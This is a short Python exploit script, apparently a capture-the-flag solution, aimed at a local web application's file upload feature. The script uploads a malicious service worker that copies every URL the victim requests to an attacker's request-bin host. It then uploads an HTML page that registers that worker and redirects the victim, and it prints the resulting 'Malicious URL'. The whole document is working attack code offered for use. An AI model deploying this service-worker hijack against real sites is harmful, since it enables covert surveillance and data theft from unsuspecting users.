import requests
import re

s = requests.Session()

TARGET = "http://localhost:8000"
REQUEST_BIN = "TODO"
MAIN_APP_URL = "TODO"

all_uploads = []

s.get(TARGET)

def upload(data):
    img_urls = s.post(f"{TARGET}/upload", files={"file": data}).text
    imgs = re.findall(r"<img src=\"([^\"]+)", img_urls)

    this_one = list(set(imgs) - set(all_uploads))[0]
    all_uploads.append(this_one)

    return this_one

SW_URL = upload('''
#!/usr/bin/nodejs
self.addEventListener('fetch', event => {
  const resp = fetch(event.request);

  fetch(`{{REQUEST_BIN}}/${event.request.url}`);

  event.respondWith(resp);
});
'''.strip().replace("{{REQUEST_BIN}}", REQUEST_BIN))

REGISTER_SW_URL = upload('''
<!DOCTYPE html>
<script>
const myFun = async () => {
  try {
    navigator.serviceWorker.register("{{SW_URL}}").then(() => {
        window.location = `{{MAIN_APP_URL}}/open_file?id=1`;
    })
  } catch (e) {
    fetch(e);
  }
}
myFun();
</script>
'''.strip().replace("{{SW_URL}}", SW_URL).replace("{{MAIN_APP_URL}}", MAIN_APP_URL))

print("Malicious URL:")
print(REGISTER_SW_URL)
